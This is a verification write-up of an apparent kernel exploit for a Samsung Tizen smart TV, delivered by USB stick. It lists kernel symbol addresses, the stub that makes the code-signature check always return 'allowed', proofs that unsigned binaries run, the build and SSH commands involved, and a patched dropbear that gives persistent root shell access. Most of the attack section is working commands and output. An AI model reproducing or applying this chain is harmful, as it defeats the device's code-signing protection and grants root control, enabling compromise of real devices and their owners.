# Verification — T-KTMUABC 1410.1 (2026-11-03)

Independent run on a live UN43MU6100, from `/proc/version`:

```
Linux version 4.1.10 (abuild@A0919LHG) (gcc version 4.9.2 (Tizen/Linaro GCC 4.9.2 2015.06) )
#1 SMP PREEMPT Wed Jun 11 23:42:23 UTC 2025
```

## 1. Gate address and why 2 is "allow"

`SfdUepVerifyFileSignature` is `EXPORT_SYMBOL`'d, so its address is in
`__ksymtab` even though the image has no kallsyms:

```
SfdUepVerifyFileSignature -> 0xc0211c70
v7_coherent_kern_range    -> 0xc001bfbc
call_usermodehelper       -> 0xc00389c4
```

In the vendor source (`security/sfd/`, `include/uapi/linux/sf/core/SfStatus.h`):

```
SF_STATUS_UEP_SIGNATURE_CORRECT = 2
SfReturn(): only 3 (SIGNATURE_INCORRECT), 4 (FILE_NOT_SIGNED) and
            7 (RESOURCE_BLOCK) map to -EPERM; everything else returns 0.
```

The target has `CONFIG_SECURITY_SFD_MODE_ENFORCE=y`, and the dispatcher routes
both `bprm_check_security` (exec) and `mmap_file` (loader/`dlopen`/module load)
through the same verifier. The `mov r0,#2; bx lr` stub therefore allows both
paths, not just `execve`.

## 2. Userspace proof

After the stick's kernel stage has patched the gate:

```sh
cp /bin/echo /tmp/e
chmod +x /tmp/e
/tmp/e UEP-PATCH-OK
```

`UEP-PATCH-OK` is printed. Verified as `uid=0(root)` and as `uid=5001`
through the sdbd `appcmd` channel. Before the patch the same command fails
with `Operation not permitted`.

`tools/verify-uep.sh` performs this check; run it on the TV after insertion.

## 3. Arbitrary unsigned binary

A freestanding ARMv7 binary built on the host — no libc, no interpreter,
static `ET_EXEC`, entry `0x10000` — also runs:

```sh
arm-none-eabi-gcc -nostdlib -static -no-pie -marm -march=armv7-a -O2 \
  -fno-stack-protector -fno-builtin -Wl,-Ttext=0x10000 \
  -o hello.elf hello.c
```

```sh
ssh root@<TV_IP> 'cat > /tmp/hello.elf' < hello.elf
ssh root@<TV_IP> 'chmod +x /tmp/hello.elf; /tmp/hello.elf; echo rc=$?'
```

prints the banner and exits 42. The same file copied to `/opt/hello.elf`
(mode 755) runs as `uid=5001` as well. This is the practical proof that the
neutralisation is global to the kernel, not per-process or per-path.

## 4. SSH

The vendored `dropbearmulti` is patched so root's allowlist is
`/opt/etc/dropbear/authorized_keys`, which is exactly where `stage1.sh` puts
the operator key; `/root` itself is on the read-only vdfs4 and does not need
to be writable.

With the patched gate active and the dropbear started from `/opt`:

```sh
ssh -i ~/.ssh/tv_root_ed25519 root@<TV_IP> id
uid=0(root) gid=0(root) groups=0(root),29(audio),... context="_"
```

## 5. Park — no more pegged core

The first 288-byte stage ended in `b .`; after UMH the readdir thread spun in
kernel mode: `media-server` accumulated `TIME 45:40` over `ELAPSED 46:11`
(`stime` 684,963 ticks), one core pegged, load average 21.37.

The park stage ends in `schedule_timeout_uninterruptible(250)` (`0xc0506f44`)
and repeats. On the next boot:

```
media-server PID 1220  ELAPSED 04:51  TIME 00:00:00  STAT Dsl  PSR 1
utime=76  stime=20
load average: 13.62 8.38 3.65
D_total=15
/tmp/e -> UEP-AUTO-OK
stage1 log: dropbear /opt -V rc=0: Dropbear v2022.83
            service after: active
            dropbear active; changed=0
ssh -i ~/.ssh/tv_root_ed25519 root@<TV_IP> id -> uid=0(root)
```

stage1's `umount -l p1` detached p1; only `sda2` remains mounted. The thread
still holds p1's inode mutex, so the scanner's D-state backlog/UI remains until
a reboot with the stick removed.

To keep the blob at 288 bytes, the 4-byte pad was removed (`FULL=DEST+132`) and
the argv array is built with `stmia r4,{r0-r3}`; the UEP patch, UMH command, p2
stage1 and dropbear are unchanged.

## Notes

- The patch is RAM-only. Re-insert the stick (or keep it inserted across
  boots) to re-apply it; the `/opt` files persist, the patch and the
  `/run/systemd/system` unit do not.
- `ss` is absent on this rootfs; stage1's `ss -ltn` log line is empty, but
  `/usr/bin/netstat` exists and the fatal `:22` check works.
- The p2 is mounted with `fmask=0111`, so `dropbearmulti` on p2 is data; the
  copy under `/opt/bin` is the executable that matters.
- Unrelated to the gate: the p1 trigger parks the media-scanner readdir while
  it holds p1's root inode mutex; stage1's early `umount -l` detaches p1 and
  the TV stays up, but the scanner process can still be killed by its
  watchdog.
